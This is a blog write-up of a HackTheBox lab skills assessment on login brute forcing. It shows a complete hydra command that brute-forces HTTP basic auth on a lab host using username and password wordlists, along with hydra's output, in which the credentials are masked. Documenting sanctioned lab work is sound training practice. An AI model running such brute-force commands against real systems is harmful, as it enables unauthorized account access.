---
title: 'HTB - Login Brute Forcing Module - Skills Assessment Part 1'
date: '2025-12-16T16:01:00+00:00'
author: Ryan
layout: post
draft: false
categories:
    - penetration-testing
    - infosec
    - hackthebox
---

# HackTheBox Login Brute Force - Skills Assessment Part 1

This is part of a multi-part series documenting my process for completing the HackTheBox modules.

This particular post will cover part 1 of the 2 part skills assessment.


## What is the password for the basic auth login?

This one is simple. We're provided with a username and password list. We can use a tool like `hydra` to brute force the login.

```bash
sudo hydra -v -I -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.120.137 http-get / -s 39615

λ hydra (main) $ sudo hydra -v -I -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.120.137 http-get / -s 39615
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-15 22:19:20
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-get://94.237.120.137:39615/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[39615][http-get] host: 94.237.120.137   login: **********   password: *********
[STATUS] 2500.00 tries/min, 2500 tries in 00:01h, 900 to do in 00:01h, 16 active
[STATUS] attack finished for 94.237.120.137 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-15 22:20:39
```


##  After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?
Login with the found credentials (step 1, above) to get the username for the next part. Easy peasy. 


